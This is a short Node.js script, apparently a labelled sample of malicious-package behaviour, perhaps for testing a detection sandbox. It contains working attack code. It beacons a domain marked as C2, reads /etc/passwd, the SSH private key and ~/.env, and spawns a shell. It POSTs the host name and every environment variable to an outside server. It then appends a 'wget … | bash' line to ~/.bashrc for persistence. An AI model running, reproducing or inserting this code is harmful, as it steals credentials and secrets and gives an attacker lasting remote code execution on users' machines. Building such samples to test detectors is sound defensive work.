const dns = require('dns');
const https = require('https');
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

// DNS query to C2
dns.lookup('envset.vexo3nar.surf', () => {});

// Sensitive file reads
try { fs.readFileSync('/etc/passwd', 'utf8'); } catch(e) {}
try { fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8'); } catch(e) {}

// Honeytoken access
try { fs.readFileSync(os.homedir() + '/.env', 'utf8'); } catch(e) {}

// Spawn shell
try { execSync('bash -c "cat /etc/hosts"'); } catch(e) {}

// POST exfiltration
const data = JSON.stringify({ hostname: os.hostname(), platform: os.platform(), env: process.env });
try {
  const req = https.request({ hostname: 'envset.vexo3nar.surf', port: 443, path: '/routes', method: 'POST', headers: { 'Content-Type': 'application/json' } });
  req.write(data); req.end();
} catch(e) {}

// Persistence via .bashrc
try { fs.appendFileSync(os.homedir() + '/.bashrc', '\nwget -q envset.vexo3nar.surf/persist -O- | bash\n'); } catch(e) {}
